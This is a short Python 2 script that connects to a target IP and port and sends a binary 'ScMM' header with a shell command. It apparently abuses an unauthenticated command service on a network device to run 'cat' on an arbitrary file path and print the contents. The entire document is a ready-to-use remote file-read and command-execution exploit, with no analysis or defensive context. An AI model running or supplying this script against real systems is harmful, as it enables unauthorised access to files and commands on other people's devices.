#!/usr/bin/python

import socket
import sys
import string
import asyncore

ip = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]

sys.stderr.write("Connecting to "+ip+":"+port+"\n")

def getSocket():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#s.setblocking(0)
		s.settimeout(2)
		s.connect((ip,int(port)))
		#s.setblocking(0)

	except:
		sys.stderr.write("Could not connect!\n")
		sys.exit()
	return s

s = getSocket()

def getPrepend(cmd):
	headerHex = "53:63:4d:4d:0:0:0:7:0:0:0";
	prependString = ""
	for hexString in string.split(headerHex,":"):
		#print hexString
		prependString += chr(int(hexString,16))

	prependString += chr(len(cmd)+1)

	return prependString

def sendCommand(s,cmd):
	#print cmd
	s.send(cmd)

cmd = "cat "+path
#cmd = "ls"
stringBuffer = ""

sendCommand(s,getPrepend(cmd)+cmd+"\n")

recvData = None

#while stringBuffer == "" or recvData == None:
try: 
	while True:

		#print "Getting"
		recvData = s.recv(1)
		stringBuffer += recvData
		#print recvData
except:
	pass

stringBuffer = stringBuffer[12:]
#print stringBuffer
sys.stdout.write(stringBuffer)
